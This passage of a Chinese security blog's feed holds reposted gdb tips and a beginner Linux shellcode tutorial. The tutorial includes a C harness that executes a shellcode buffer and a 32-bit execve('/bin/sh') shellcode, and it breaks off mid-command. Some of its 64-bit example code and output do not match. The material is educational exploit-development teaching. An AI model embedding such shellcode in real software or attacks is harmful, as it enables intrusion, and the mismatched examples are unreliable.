class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set disable-randomization off</span><br></pre></td></tr></table></figure><p>查看ASLR状态：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show disable-randomization</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;1-打开-terminal&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-打开-terminal&quot;&gt;&lt;/a&gt; 1. 打开 terminal&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;​</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="shellcode" scheme="https://www.rgzzplus.com/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>gdb显示intel和at&amp;t汇编</title>
    <link href="https://www.rgzzplus.com/2022/08/08/gdb%E6%98%BE%E7%A4%BAintel%E5%92%8Catt%E6%B1%87%E7%BC%96/"/>
    <id>https://www.rgzzplus.com/2022/08/08/gdb%E6%98%BE%E7%A4%BAintel%E5%92%8Catt%E6%B1%87%E7%BC%96/</id>
    <published>2022-08-08T14:36:22.000Z</published>
    <updated>2022-08-08T14:38:19.182Z</updated>
    
    <content type="html"><![CDATA[<p>本文转载自：<a href="https://blog.csdn.net/freezing111/article/details/70576865">Linux下gdb显示intel和at&amp;t汇编</a></p><p>在windows下使用习惯了intel汇编，在Linux下看的难受，在gdb下使用</p><p>set disassembly-flavor intel 转换为intel格式的汇编</p><p>set disassembly-flavor att 转换为att格式的汇编</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文转载自：&lt;a href=&quot;https://blog.csdn.net/freezing111/article/details/70576865&quot;&gt;Linux下gdb显示intel和at&amp;amp;t汇编&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在windows下使用习惯了intel汇编，在</summary>
      
    
    
    
    <category term="转载" scheme="https://www.rgzzplus.com/categories/%E8%BD%AC%E8%BD%BD/"/>
    
    
    <category term="gdb" scheme="https://www.rgzzplus.com/tags/gdb/"/>
    
  </entry>
  
  <entry>
    <title>gdb调试带参程序</title>
    <link href="https://www.rgzzplus.com/2022/08/08/gdb%E8%B0%83%E8%AF%95%E5%B8%A6%E5%8F%82%E7%A8%8B%E5%BA%8F/"/>
    <id>https://www.rgzzplus.com/2022/08/08/gdb%E8%B0%83%E8%AF%95%E5%B8%A6%E5%8F%82%E7%A8%8B%E5%BA%8F/</id>
    <published>2022-08-08T14:33:41.000Z</published>
    <updated>2022-08-08T14:36:56.316Z</updated>
    
    <content type="html"><![CDATA[<p>本文转载自：<a href="https://www.cnblogs.com/rosesmall/archive/2012/04/10/2440514.html">gdb调试带参数程序</a></p><p><strong>具体来说就是</strong></p><p><strong>例如一个程序名为prog 参数为 -l a -C abc<br>则，运行gcc/g++ -g prog.c/cpp -o prog</strong></p><p><strong>就可以用gdb调试程序prog<br>#gdb prog</strong></p><p><strong>进入gdb调试界面</strong></p><p><strong>输入参数命令set args 后面加上程序所要用的参数，注意，不再带有程序名，直接加参数，如：<br>set args -l a -C abc</strong></p><p><strong>回车后输入</strong></p><p><strong>r</strong></p><p><strong>即可开始</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文转载自：&lt;a href=&quot;https://www.cnblogs.com/rosesmall/archive/2012/04/10/2440514.html&quot;&gt;gdb调试带参数程序&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;具体来说就是&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;s</summary>
      
    
    
    
    <category term="转载" scheme="https://www.rgzzplus.com/categories/%E8%BD%AC%E8%BD%BD/"/>
    
    
    <category term="gdb" scheme="https://www.rgzzplus.com/tags/gdb/"/>
    
  </entry>
  
  <entry>
    <title>gdb插件自动切换</title>
    <link href="https://www.rgzzplus.com/2022/08/08/gdb%E6%8F%92%E4%BB%B6%E8%87%AA%E5%8A%A8%E5%88%87%E6%8D%A2/"/>
    <id>https://www.rgzzplus.com/2022/08/08/gdb%E6%8F%92%E4%BB%B6%E8%87%AA%E5%8A%A8%E5%88%87%E6%8D%A2/</id>
    <published>2022-08-08T14:31:58.000Z</published>
    <updated>2022-09-03T04:11:57.966Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文转载自：<a href="https://www.cnblogs.com/welhzh/p/13958736.html">gdb 的配置、插件plugin与多彩显示 </a></p><p>若未下载这些插件：<a href="https://blog.csdn.net/qq_51232724/article/details/124133459">Linux下gdb(插件pwndbg、pead、gef)安装及调试常用指令</a></p></blockquote><p>PwnDbg、gef、peda 的自动切换，其实就是切换配置文件：</p><p>先把他们全部装上，当然你可以选择自己感兴趣的安装，他们的配置都需要通过 ~/.gdbinit 来配置，因此他们是互斥的，配置里只能配置一种，但是可以用下面的这种方法解决，下面的示例只写了 peda、PwnDbg和gef，其它自己加。</p><p>1、Open your .gdbinit file, delete any contents and paste the following configuration:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">define init-peda</span><br><span class="line">source ~/peda/peda.py</span><br><span class="line">end</span><br><span class="line">document init-peda</span><br><span class="line">Initializes the PEDA (Python Exploit Development Assistant for GDB) framework</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">define init-pwndbg</span><br><span class="line">source ~/.gdbinit_pwndbg</span><br><span class="line">end</span><br><span class="line">document init-pwndbg</span><br><span class="line">Initializes PwnDBG</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">define init-gef</span><br><span class="line">source ~/.gdbinit-gef.py</span><br><span class="line">end</span><br><span class="line">document init-gef</span><br><span class="line">Initializes GEF (GDB Enhanced Features)</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>Then, create the following 3 files in one of your $PATH folder:<br>然后，分别创建下列三个文件在你的 $PATH 文件夹中（查看$PATH文件夹命令：echo $PATH）：</p><p>First create a file named by gdb-peda and paste the following:<br>首先创建一个名为 gdb-peda 的文件，并将下列内容复制进去：</p><blockquote><p>创建文件指令：sudo touch gdb-peda</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">exec gdb -q -ex init-peda &quot;$@&quot;</span><br></pre></td></tr></table></figure><p>Then gdb-pwndbg:<br>然后是 gdb-pwndbg:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">exec gdb -q -ex init-pwndbg &quot;$@&quot;</span><br></pre></td></tr></table></figure><p>Then gdb-gef:<br>然后是 gdb-gef：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">exec gdb -q -ex init-gef &quot;$@&quot;</span><br></pre></td></tr></table></figure><p>最后分别修改它们的可执行权限：（注：<mark>gdb-* 代表 gdb-gef、gdb-peda、gdb-pwndbg</mark>）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /usr/bin/gdb-*</span><br></pre></td></tr></table></figure><p>然后你就可以使用 gdb-peda, gdb-pwndbg 或 gdb-gef 来运行相应的gdb plugin版了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文转载自：&lt;a href=&quot;https://www.cnblogs.com/welhzh/p/13958736.html&quot;&gt;gdb 的配置、插件plugin与多彩显示 &lt;/a&gt;&lt;/p&gt;
&lt;p&gt;若未下载这些插件：&lt;a href=&quot;https://b</summary>
      
    
    
    
    <category term="转载" scheme="https://www.rgzzplus.com/categories/%E8%BD%AC%E8%BD%BD/"/>
    
    
    <category term="gdb" scheme="https://www.rgzzplus.com/tags/gdb/"/>
    
  </entry>
  
  <entry>
    <title>Linux汇编之伪指令</title>
    <link href="https://www.rgzzplus.com/2022/08/05/Linux%E6%B1%87%E7%BC%96%E4%B9%8B%E4%BC%AA%E6%8C%87%E4%BB%A4/"/>
    <id>https://www.rgzzplus.com/2022/08/05/Linux%E6%B1%87%E7%BC%96%E4%B9%8B%E4%BC%AA%E6%8C%87%E4%BB%A4/</id>
    <published>2022-08-05T12:56:04.000Z</published>
    <updated>2022-09-05T09:19:32.962Z</updated>
    
    <content type="html"><![CDATA[<p>作者：Reesun<br>链接：<a href="http://blog.chinaunix.net/uid-20548989-id-1667484.html">http://blog.chinaunix.net/uid-20548989-id-1667484.html</a><br>来源：Chinaunix</p><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">msg:</span><br><span class="line">.ascii &quot;hello 32-bit!\n&quot;</span><br><span class="line">len = . - msg</span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">movl $1, %rdi</span><br><span class="line">movl $msg, %rsi</span><br><span class="line">movl $1, %rdx</span><br><span class="line">movl $4, %rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">xorq %rdi, %rdi</span><br><span class="line">movq $60, %rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.section .data</span><br></pre></td></tr></table></figure><p>汇编程序中以<code>.</code>开头的名称并不是指令的助记符，不会被翻译成机器指令，而是给汇编器一些特殊指示，称为汇编指示（Assembler Directive）或伪操作（Pseudo-operation），由于它不是真正的指令所以加个“伪”字。<code>.section</code>指示把代码划分成若干个段（Section），程序被操作系统加载执行时，每个段被加载到不同的地址，操作系统对不同的页面设置不同的读、写、执行权限。</p><p><code>.data</code>段保存程序的数据，是<mark>可读可写</mark>的，相当于C程序的全局变量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.section .text</span><br></pre></td></tr></table></figure><p><code>.text</code>段保存代码，是<mark>只读和可执行</mark>的，后面那些指令都属于<code>.text</code>段。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.globl _start</span><br></pre></td></tr></table></figure><p><code>_start</code>是一个符号（Symbol），符号在汇编程序中<mark>代表一个地址</mark>，可以用在指令中，汇编程序经过汇编器的处理之后，所有的符号都被替换成它所代表的地址值。在C语言中我们通过变量名访问一个变量，其实就是读写某个地址的内存单元，我们通过函数名调用一个函数，其实就是跳转到该函数第一条指令所在的地址，所以变量名和函数名都是符号，本质上是代表内存地址的。</p><p><code>.globl</code>指示告诉汇编器，<code>_start</code>这个符号要被链接器用到，所以要在目标文件的符号表中标记它是一个全局符号（在<a href="http://learn.akae.cn/media/ch18s05.html#asm.relocatable">第 5.1 节 “目标文件”</a>详细解释）。<code>_start</code>就像C程序的<code>main</code>函数一样特殊，是<mark>整个程序的入口</mark>，链接器在链接时会查找目标文件中的<code>_start</code>符号代表的地址，把它设置为整个程序的入口地址，所以每个汇编程序都要提供一个<code>_start</code>符号并且用<code>.globl</code>声明。<strong>如果一个符号没有用<code>.globl</code>声明，就表示这个符号不会被链接器用到</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_start:</span><br></pre></td></tr></table></figure><p>这里定义了<code>_start</code>符号，汇编器在翻译汇编程序时会计算每个数据对象和每条指令的地址，当看到这样一个符号定义时，就<strong>把它后面一条指令的地址作为这个符号所代表的地址</strong>。而<code>_start</code>这个符号又比较特殊，它所<strong>代表的地址是整个程序的入口地址</strong>，所以下一条指令<code>movl $1, %rdi</code>就成了程序中第一条被执行的指令。</p><blockquote><p>相关好文：<a href="https://www.cnblogs.com/kuangke/p/12456976.html">Linux 汇编语言开发指南 Intel 格式－－AT&amp;T 格式</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;作者：Reesun&lt;br&gt;
链接：&lt;a href=&quot;http://blog.chinaunix.net/uid-20548989-id-1667484.html&quot;&gt;http://blog.chinaunix.net/uid-20548989-id-1667484.html&lt;</summary>
      
    
    
    
    <category term="转载" scheme="https://www.rgzzplus.com/categories/%E8%BD%AC%E8%BD%BD/"/>
    
    
    <category term="Linux汇编伪指令" scheme="https://www.rgzzplus.com/tags/Linux%E6%B1%87%E7%BC%96%E4%BC%AA%E6%8C%87%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>Linux—shellcode开发入门</title>
    <link href="https://www.rgzzplus.com/2022/08/05/Linux-shellcode%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/"/>
    <id>https://www.rgzzplus.com/2022/08/05/Linux-shellcode%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/</id>
    <published>2022-08-05T12:48:42.000Z</published>
    <updated>2022-09-05T06:55:54.233Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="1-什么是-shellcode"><a class="markdownIt-Anchor" href="#1-什么是-shellcode"></a> 1. 什么是 shellcode ？</h1><p>shellcode 通常用机器语言编写，是一段用于软件漏洞而执行的代码，因其目的常常是让攻击者获得目标机器的命令行 shell 而得名。随着发展，shellcode 现在代表将插入到漏洞利用程序中以完成所需任务的任何字节码。</p><h1 id="2-shellcode-原理"><a class="markdownIt-Anchor" href="#2-shellcode-原理"></a> 2. shellcode 原理</h1><h2 id="21-理解系统调用"><a class="markdownIt-Anchor" href="#21-理解系统调用"></a> 2.1 理解系统调用</h2><p>shellcode 通常是一段能够执行某些系统调用的代码，所以直接通过一个int 0x80系统调用，指定想调用的函数的系统调用号（syscall），传入调用函数的参数，即可。</p><p>Linux 操作系统（2.6及更早的内核版本），通常用 <code>int $0x80软中断 + 系统调用号</code>（保存到eax中）来实现系统调用，其<mark>参数传递顺序依次为 ebx、ecx、edx、esi和edi</mark>，返回值存放在eax。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">msg:</span><br><span class="line">.ascii &quot;hello 32-bit!\n&quot;</span><br><span class="line">len = . - msg</span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">movl $len, %edx</span><br><span class="line">movl $msg, %ecx</span><br><span class="line">movl $1, %ebx</span><br><span class="line">movl $4, %eax</span><br><span class="line">int $0x80</span><br><span class="line"></span><br><span class="line">movl $0, %ebx</span><br><span class="line">movl $1, %eax</span><br><span class="line">int $0x80</span><br></pre></td></tr></table></figure><p>编译执行（可编译成 64 位程序）：<mark>用gcc编译，生成目标文件，用ld来链接</mark></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -m32 -c hello32.S</span><br><span class="line">$ ld -m elf_i386 -o hello32 hello32.o</span><br><span class="line">$ strace ./hello32                                                                   127 ⨯</span><br><span class="line">execve(<span class="string">&quot;./hello32&quot;</span>, [<span class="string">&quot;./hello32&quot;</span>], 0x7ffd941ae900 /* 61 vars */) = 0</span><br><span class="line">[ Process PID=3197 runs <span class="keyword">in</span> 32 bit mode. ]</span><br><span class="line">write(1, <span class="string">&quot;hello 32-bit!\n&quot;</span>, 14hello 32-bit!</span><br><span class="line">)         = 14</span><br><span class="line"><span class="built_in">exit</span>(0)                                 = ?</span><br><span class="line">+++ exited with 0 +++</span><br></pre></td></tr></table></figure><p>虽然软中断 int 0x80 非常经典，但是由于其性能较差，<strong>在往后的内核中被快速调用指令代替，32 位系统使用 sysenter(对应 sysexit)指令，64 位系统则使用 syscall（对应 sysret）指令。</strong></p><h2 id="22-调用约定"><a class="markdownIt-Anchor" href="#22-调用约定"></a> 2.2 调用约定</h2><p>调用约定是对函数调用时如何传递参数的一种约定。</p><p>（1）内核接口</p><ul><li>x86-32 系统调用约定：Linux系统调用使用寄存器传递参数。<mark>eax 存放系统调用号（syscall_number），ebx、ecx、edx、esi 和 ebp 用于将6个参数传递给系统调用</mark>。返回值保存在 eax 中。所有其它寄存器（包括 EFLAGS）都保存在 int 0x80 中。</li><li>x86-64 系统调用约定：系统调用的参数限制为 6 个，不直接从堆栈上传递任何参数。==rax 存放系统调用号（syscall_namber）。内核接口使用的寄存器有 rdi、rsi、rdx、rcx、r8 和 r9。==系统调用通过 syscall 指令完成。除了 rcx、r11 和 eax，其它寄存器都被保留。返回值保存在 rax 中，只有 INTEGER 或者 MEMORY 类型的值才会被传递给内核。</li></ul><p>（2）用户接口</p><ul><li>x86-32 函数调用约定：<mark>参数通过栈进行传递</mark>。最后一个参数第一个被放入栈中，知道所有的参数都放置完毕，然后执行 call 指令。</li><li>x86-64 函数调用约定：<mark>x86-64 下通过寄存器传递参数</mark>，这样做比栈更有效率。它避免了内存中参数的存取和额外的指令。根据参数类型的不同，会使用寄存器或传参方式。如果参数类型是 <mark>MEMORY</mark>，则在<mark>栈上传递参数</mark>。如果类型是 <mark>INTEGER</mark>，则==顺序使用 rdi、rsi、rdx、rcx、r8 和 r9。==如果多于 6 个参数，则后面的参数将在栈中传递。</li></ul><h3 id="22-32位程序使用-sysenter-的例子"><a class="markdownIt-Anchor" href="#22-32位程序使用-sysenter-的例子"></a> 2.2 *32位程序使用 sysenter 的例子</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">msg:</span><br><span class="line">.ascii &quot;Hello sysenter!\n&quot;</span><br><span class="line">len = . - msg</span><br><span class="line"></span><br><span class="line">.text </span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">movl $len, %edx</span><br><span class="line">movl $msg, %ecx</span><br><span class="line">movl $1, %ebx</span><br><span class="line">movl $4, %eax</span><br><span class="line">#为sysenter布置栈</span><br><span class="line">pushl $sysenter_ret</span><br><span class="line">pushl %ecx</span><br><span class="line">pushl %edx</span><br><span class="line">pushl %ebp</span><br><span class="line">movl %esp,%ebp</span><br><span class="line">sysenter</span><br><span class="line"></span><br><span class="line">sysenter_ret:</span><br><span class="line">movl $0, %ebx</span><br><span class="line">movl $1, %eax</span><br><span class="line">#为sysenter布置栈</span><br><span class="line">pushl $sysenter_ret</span><br><span class="line">pushl %ecx</span><br><span class="line">pushl %edx</span><br><span class="line">pushl %ebp</span><br><span class="line">movl %esp,%ebp</span><br><span class="line">sysenter</span><br></pre></td></tr></table></figure><p>可以看到，为了使用 sysenter 指令，需要<strong>手动为其布置栈</strong>。这是因为 sysenter 返回时，会执行 _kernel_vsyscall 的后半部分（从 0xf7fd5059 开始）。_kernel_vsyscall 封装了 sysenter 调用的规范，是 vDSO 的一部分，而 vDSO 运行程序在用户层中执行代码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disasseble __kernel_vsyscall</span><br><span class="line">0xf7fd5050 &lt;+0&gt;:push ecx</span><br><span class="line">0xf7fd5051 &lt;+1&gt;:push edx</span><br><span class="line">0xf7fd5052 &lt;+2&gt;:push ebp</span><br><span class="line">0xf7fd5053 &lt;+3&gt;:movebp,esp</span><br><span class="line">0xf7fd5055 &lt;+5&gt;:sysenter</span><br><span class="line">0xf7fd5057 &lt;+7&gt;:int 0x80</span><br><span class="line">--&gt;0xf7fd5059 &lt;+9&gt;:popebp</span><br><span class="line">0xf7fd505a &lt;+10&gt;:popedx</span><br><span class="line">0xf7fd505b &lt;+11&gt;:pop ecx</span><br><span class="line">0xf7fd505c &lt;+12&gt;:ret</span><br></pre></td></tr></table></figure><p>编译执行（不可编译成 64 位程序）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -m32 -c sysenter32.S</span><br><span class="line">$ ld -m elf_i386 -o sysenter sysenter32.o</span><br><span class="line">$ strace ./sysenter</span><br><span class="line">execve(<span class="string">&quot;./sysenter&quot;</span>, [<span class="string">&quot;./sysenter&quot;</span>], 0x7ffe74dda6e0 /* 61 vars */) = 0</span><br><span class="line">[ Process PID=3638 runs <span class="keyword">in</span> 32 bit mode. ]</span><br><span class="line">write(1, <span class="string">&quot;Hello sysenter!\n&quot;</span>, 16Hello sysenter!</span><br><span class="line">)       = 16</span><br><span class="line"><span class="built_in">exit</span>(0)                                 = ?</span><br><span class="line">+++ exited with 0 +++</span><br></pre></td></tr></table></figure><h3 id="23-64位程序使用-syscall-的例子"><a class="markdownIt-Anchor" href="#23-64位程序使用-syscall-的例子"></a> 2.3 *64位程序使用 syscall 的例子</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">msg:</span><br><span class="line">.ascii &quot;hello 32-bit!\n&quot;</span><br><span class="line">len = . - msg</span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">movl $1, %rdi</span><br><span class="line">movl $msg, %rsi</span><br><span class="line">movl $1, %rdx</span><br><span class="line">movl $4, %rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">xorq %rdi, %rdi</span><br><span class="line">movq $60, %rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>编译执行（不可编译成 32 位程序）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">gcc -c hello64.S</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">ld -o hello64 hello64.o</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">strace ./hello64</span> </span><br><span class="line">execve(&quot;./hello64&quot;, [&quot;./hello64&quot;], 0x7fffe7d694a0 /* 61 vars */) = 0</span><br><span class="line">write(1, &quot;hello 64-bit!\n&quot;, 14hello 64-bit!</span><br><span class="line">)         = 14</span><br><span class="line">exit(0)                                 = ?</span><br><span class="line">+++ exited with 0 +++</span><br></pre></td></tr></table></figure><h1 id="3-编写简单-shellcode"><a class="markdownIt-Anchor" href="#3-编写简单-shellcode"></a> 3. 编写简单 shellcode</h1><p>shellcode 只是一段代码，为了运行和验证，我们通常用<strong>函数指针</strong>或者<strong>内联函数</strong>的方式把它嵌入到C程序中来调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> shellcode[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//当shellcode包含空字符时，printf 将会打印出错误的 shellcode 长度</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Shellcode length: %d bytes\n&quot;</span>,<span class="built_in">strlen</span>(shellcode));</span><br><span class="line">    (*(<span class="type">void</span>(*)())shellcode)();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//污染所有寄存器，确保shellcode 在任何环境下都能运行</span></span><br><span class="line">    <span class="comment">/* __asm__(</span></span><br><span class="line"><span class="comment">    &quot;mov %eax, %ebx\n\t&quot;</span></span><br><span class="line"><span class="comment">&quot;mov %eax, %ecx\n\t&quot;</span></span><br><span class="line"><span class="comment">            &quot;mov %eax, %edx\n\t&quot;</span></span><br><span class="line"><span class="comment">            &quot;mov %eax, %esi\n\t&quot;</span></span><br><span class="line"><span class="comment">            &quot;mov %eax, %edi\n\t&quot;</span></span><br><span class="line"><span class="comment">            &quot;mov %eax, %ebp\n\t&quot;</span></span><br><span class="line"><span class="comment">            &quot;call shellcode&quot;);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <a href="http://www.shell-storm.org/shellcode/">shell-storm</a>找一些 shellcode 学习案例，先看一个实现 execve(&quot;/bin/sh&quot;) 的 Linux 32位的程序。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">; int execve(const char *filename, char *const argv[], char *const envp[])</span><br><span class="line"></span><br><span class="line">xorecx, ecx; ecx = NULL</span><br><span class="line">mulecx; eax and edx = NULL</span><br><span class="line">moval, 11; execve syscall</span><br><span class="line">pushecx; string NULL</span><br><span class="line">push0x68732f2f; &quot;//sh&quot;</span><br><span class="line">push0x6e69622f; &quot;/bin&quot;</span><br><span class="line">movebx, esp; pointer to &quot;/bin/sh\0&quot; string</span><br><span class="line">int0x80; bingo</span><br></pre></td></tr></table></figure><p>首先用 NASM 对这段汇编代码进行编译，然后使用 ld 链接，运行后获得shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">nasm -f elf32 